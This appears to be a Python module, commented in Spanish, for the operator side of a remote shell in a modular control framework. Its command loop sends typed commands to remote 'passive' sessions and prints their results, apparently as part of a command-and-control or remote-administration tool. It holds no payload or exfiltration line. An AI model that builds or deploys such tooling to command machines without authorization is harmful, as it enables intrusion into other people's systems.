# Labels
__RESOURCE_TYPE__ = "DYNAMIC"
__SELECTABLE__ = True
__PLATFORM_COMPATIBILITY__ = ["ALL"]
__ARCHITECTURE_COMPATIBILITY__ = ["ALL"]
__CONFIGURABLE__ = False
__STATIC_CONFIGURATIONS__ = {}

# Library import
from ... import ControlModule
from ......utils.logger import logger
from ......utils.debug import smart_debug
from configurations import Configurations
import threading
import time
import uuid
import queue
from typing import Optional, Dict

# Constants
ModuleConfigurations = Configurations()

# Classes definition
class ShellActive(ControlModule):
    MODULE_NAME: str = "SYSTEM_SHELL_ACTIVE"
    CONTROL_NAME: str = "SYSTEM_SHELL"
    REMOTE_MODULE: str = "SYSTEM_SHELL_PASSIVE"
    CONFIGURATIONS: Configurations = ModuleConfigurations
    print(F"[{CONTROL_NAME}-{MODULE_NAME}] Class created successfully")

    def __init__(self, layer) -> None:
        super().__init__(layer)
        
        # Inyección de la capa de comunicaciones
        self._communication_layer = layer.layers_container.query_layer("COMMUNICATION")
        self.logger = logger(f"CONTROL_{self.MODULE_NAME}_ACTIVE")
        
        self._ui_thread: Optional[threading.Thread] = None
        self._response_timeout: int = 10 # Segundos de espera por comando
        print(f"[{self.CONTROL_NAME}-{self.MODULE_NAME}] Instance created successfully")

    @smart_debug(element_name=MODULE_NAME, include_args=True, include_result=True)
    def _send_and_wait_response(self, session_id: str, command: str) -> Optional[str]:
        """
        Envía un comando y bloquea el hilo actual hasta recibir la respuesta 
        correlacionada por PACKET_ID o alcanzar el timeout.
        """
        packet_id = str(uuid.uuid4())[:8] # ID corto para legibilidad
        payload = {
            "COMMAND": command,
            "PACKET_ID": packet_id
        }

        print(f"[{self.CONTROL_NAME}-{self.MODULE_NAME}] Sending datapackage:")
        print("==========")
        print(payload)
        print("==========")

        # 1. Enviar comando
        print(f"[{self.CONTROL_NAME}-{self.MODULE_NAME}] Sending datapackage...")
        send_result = self._communication_layer.send_datapackage(
            datapackage=payload,
            module_name=self.REMOTE_MODULE,
            session_identifier=session_id
        )

        print(f"[{self.CONTROL_NAME}-{self.MODULE_NAME}] Send result: {send_result}")

        # Se envia el paquete de datos al modulo: SYSTEM_SHELL, de rol: PASSIVE

        # 2. Bucle de espera de respuesta (Síncrono para la CLI)
        print(f"[{self.CONTROL_NAME}-{self.MODULE_NAME}] Waiting for response (timeout: {self._response_timeout})...")
        start_time = time.time()
        
        while (time.time() - start_time) < self._response_timeout:
            try:
                # Buscamos en la cola de recepción de este módulo y sesión
                response = self._communication_layer.receive_datapackage(
                    session_identifier=session_id,
                    module_name=self.MODULE_NAME,
                    timeout=self._response_timeout # Poll corto para verificar el timeout global
                )

                #print(f"[{self.CONTROL_NAME}-{self.MODULE_NAME}] Response received:")
                #print("==========")
                #print(response)
                #print("==========")

                # Recibe paquetes de datos para el modulo: SYSTEM_SHELL, de rol: ACTIVE
                if response:
                    if response is not None:
                        print(f"[{self.CONTROL_NAME}-{self.MODULE_NAME}] Response received:")
                        print("==========")
                        print(response)
                        print("==========")

                        print(f"[{self.CONTROL_NAME}-{self.MODULE_NAME}] Origin package ID: {packet_id}. Received package ID: {response.get('PACKET_ID')} (Are the same?: {packet_id==response.get('PACKET_ID')})")

                if response:
                    return response.get("RESULT", "ANY_CONTENT")
                
                #if response and response.get("PACKET_ID") == packet_id:
                    #print(f"[{self.CONTROL_NAME}-{self.MODULE_NAME}] Response received without content")
                #    return response.get("RESULT", "[!] Respuesta recibida sin contenido.")
                
            except queue.Empty:
                continue
            except Exception as e:
                return f"[!] Error en recepción: {str(e)}"

        return f"[!] Error: Timeout alcanzado ({self._response_timeout}s) para el paquete {packet_id}"

    def _cli_loop(self) -> None:
        """
        Interfaz de línea de comandos interactiva.
        """
        #print(f"\n--- {self.MODULE_NAME} INTERACTIVE INTERFACE ---")
        print(f"[{self.CONTROL_NAME}-{self.MODULE_NAME}] Starting command loop interface...")

        while self.active:
            # 1. Selección de sesión (si hay múltiples)
            sessions = list(self._communication_layer.sessions_table.keys())
            if not sessions:
                print(f"[{self.CONTROL_NAME}-{self.MODULE_NAME}] Waiting for active sessions...")
                time.sleep(5)
                continue

            # Para este ejemplo, tomamos la primera sesión activa o implementamos un selector
            target_session = sessions[0]
            
            prompt = f"stark@{target_session[:6]}:~# "
            try:
                cmd = input(prompt).strip()
                
                if not cmd:
                    continue
                if cmd.lower() in ["exit", "quit"]:
                    self.logger.info("Closing ShellActive CLI...")
                    print(f"[{self.CONTROL_NAME}-{self.MODULE_NAME}] Stopping command interface: the user request the exit")
                    break
                
                # Ejecución y espera
                print(f"[{self.CONTROL_NAME}-{self.MODULE_NAME}] Sending command: {cmd}")
                result = self._send_and_wait_response(target_session, cmd)
                print(f"[{self.CONTROL_NAME}-{self.MODULE_NAME}] Send command result:")
                print("==========")
                print(result)
                print("==========")

            except EOFError:
                break
            except Exception as e:
                print(f"[!!] CLI Error: {e}")

        print(f"[{self.CONTROL_NAME}-{self.MODULE_NAME}] Stopping command loop: The module is already inactive")

        self._set_status(active=False)

    # Public Methods
    @smart_debug(element_name=MODULE_NAME, include_args=True, include_result=True)
    def start(self) -> bool:
        print(f"[{self.CONTROL_NAME}-{self.MODULE_NAME}] Starting module...")

        if self.active:
            print(f"[{self.CONTROL_NAME}-{self.MODULE_NAME}] Module already started")
            return True

        self.logger.info("Starting SHELL_ACTIVE module (Operator Mode)...")
        self._set_status(active=True)

        # Lanzamos la CLI en un hilo separado para no bloquear el sistema principal
        self._ui_thread = threading.Thread(
            target=self._cli_loop,
            daemon=True # Queremos que persista mientras el operador interactúa
        )
        self._ui_thread.start()
        print(f"[{self.CONTROL_NAME}-{self.MODULE_NAME}] Started successfully")

        return True

    @smart_debug(element_name=MODULE_NAME, include_args=True, include_result=True)
    def stop(self) -> bool:
        print(f"[{self.CONTROL_NAME}-{self.MODULE_NAME}] Stopping module...")
        self.logger.info("Stopping SHELL_ACTIVE module...")
        self._set_status(active=False)
        print(f"[{self.CONTROL_NAME}-{self.MODULE_NAME}] Stopped successfully")

        return True

    def configure(self, configurations: object) -> bool:
        print(f"[{self.CONTROL_NAME}-{self.MODULE_NAME}] Configurating module...")
        self.configurations = configurations
        print(f"[{self.CONTROL_NAME}-{self.MODULE_NAME}] Configurated successfully")
        return self._set_configurated(True)